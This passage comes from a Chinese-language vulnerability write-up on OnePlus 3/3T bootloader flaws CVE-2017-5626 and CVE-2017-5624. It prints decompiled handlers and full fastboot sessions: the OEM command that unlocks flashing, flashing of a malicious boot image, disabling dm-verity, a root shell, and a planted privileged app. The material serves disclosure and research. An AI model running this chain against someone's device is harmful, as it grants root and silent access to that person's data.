        {
          v7 = "Partition flashing is not allowed";
          return FAIL2((int)v7, v5);
        }
    LABEL_23:
        assert(v4, v5, v6);
      }
      v4 = sub_918428F0(v3, v5);
      if ( !v4 || magicFlag_dword_91989C10 )
        goto LABEL_7;
      v6 = dword_9198D804;
      ...
      v7 = "Critical partition erase is not allowed";
      return FAIL2((int)v7, v5);
    }
**利用CVE-2017-5626进行内核代码执行**
通过利用此漏洞，攻击者可以刷入恶意引导映像（其中包含两个内核和Root
RAMFS）来得到自身的平台。但问题是，引导程序和平台检测这样的修改，这被称为验证启动。引导加载程序验证boot和recovery分区-刷入一个修改的boot分区，例如，会在引导时提示以下警告：
另一个不会触发此警告的选项是刷入旧的未修改的引导映像 – 较旧的映像包含可被攻击者利用的已知安全漏洞。
总之，尽管有警告(5秒后自动消失),OnePlus 3 / 3T仍然允许在红色验证状态启动，因此攻击者的代码得到执行。
有无数的方法来证明这种情况的严重性，所以我选择了最简单的方法。
通过修改引导映像：
1\. 我添加androidboot.selinux=permissive到内核命令行来设置SELinux的permissive模式。
2\. 我已经修改了ramfsST
ro.debuggable=1，ro.secure=0，ro.adb.secure=0，并改变了USB配置属性（sys.usb.config），包括启动adb。
然后，我利用此漏洞，刷入修改后的boot.img（evil_boot.img）：
    λ fastboot flash boot evil_boot.img
    target reported max download size of 440401920 bytes
    sending 'boot' (14836 KB)...
    OKAY [  0.335s]
    writing 'boot'...
    FAILED (remote: Partition flashing is not allowed)
    finished. total time: 0.358s
    λ  fastboot oem 4F500301
    ...
    OKAY [  0.020s]
    finished. total time: 0.021s
    λ fastboot flash boot  evil_boot.img
    target reported max download size of 440401920 bytes
    sending 'boot' (14836 KB)...
    OKAY [  0.342s]
    writing 'boot'...
    OKAY [  0.135s]
    finished. total time: 0.480s
于是我得到了一个root shell，甚至在用户输入他的凭据之前：
    OnePlus3:/ # id
    uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),
    1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),
    3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
    OnePlus3:/ # getenforce
    Permissive
OnePlus 3 / 3T内核似乎是在启用LKM的情况下编译的，因此运行内核代码甚至不需要修补/重新编译内核。
所以我创建了一个小的内核模块：
    #include 
    #include 
    int init_module(void)
    {
        printk(KERN_ALERT "Hello From Kerneln");
        return 1;
    }
然后将其加载到内核中：
    OnePlus3:/data/local/tmp # insmod ./test.ko
    OnePlus3:/data/local/tmp # dmesg | grep Hello
    [19700121_21:09:58.970409]@3 Hello From Kernel
**禁用dm-verity（CVE-2017-5624）**
system分区的验证，不是boot＆recovery，是通过dm-verity驱动的。我们发现可以命令一个已锁定引导程序唤醒该平台,使用另一个FASTBOOT命令禁止dm-verity：fastboot oem
disable_dm_verity。
该oem disable_dm_verity处理程序如下：
    // 'oem disable_dm_verity' handler
    int sub_9183B8EC()
    {
      int v0; // r0@1
      int v1; // r1@1
      dmVerity_dword_91960740 = 0;
      v0 = sub_91845E10("ANDROID-BOOT!");
      if ( dword_9198D804 != dword_9198D804 )
        assert(v0, v1, dword_9198D804);
      return sendOK((int)"", v1);
    }
又一次，91960740设置了一些标志（我们称为dmVerity）。引导加载程序构建内核cmdline时会使用它：
androidboot.enable_dm_verity内核命令行参数传递到ro.boot.enable_dm_verity,然后指示OnePlus的init,是否要禁用dm-verity：
**2个漏洞组合利用**
这两个漏洞可以组合在一起，用于具有特权的SELinux域代码执行，而不向用户发出任何警告并访问原始用户数据。为了演示这一点（可能有成千上万更好的方法与更高的严重性），我修改了系统分区，添加了一个特权应用程序。可以在/system/priv-app/目录下放置APK下,最终将导致它被添加到[priv_app域](https://android.googlesource.com/platform/system/sepolicy/+/android-7.1.1_r16/priv_app.te)中。
    λ fastboot flash system system-modded.simg
    target reported max download size of 440401920 bytes
    erasing 'system'...
    FAILED (remote: Partition erase is not allowed)
    finished. total time: 0.014s
    λ fastboot oem 4F500301
    OKAY
    [  0.020s] finished. total time: 0.021s
    λ fastboot flash system system-modded.simg
    target reported max download size of 440401920 bytes erasing 'system'...
    OKAY [  0.010s]
    ...
    sending sparse 'system' 7/7 (268486 KB)...
    OKAY [  6.748s]
    writing 'system' 7/7...
    OKAY [  3.291s]
    finished. total time: 122.675s
    λ fastboot oem disable_dm_verity
    ...
    OKAY
    [  0.034s] finished. total time: 0.036s
事实上，加载priv_app的应用程序上下文如下：
    1|OnePlus3:/ $ getprop | grep dm_verity
    [ro.boot.enable_dm_verity]: [0]
    OnePlus3:/ $ ps -Z | grep roeeh
    u:r:priv_app:s0:c512,c768      u0_a16    4764  2200  1716004 74600 SyS_epoll_ 0000000000 S roeeh.fooapp
**演示视频**
以下视频显示结果 – 平台已加载并没有警告，并安装了特权应用程序。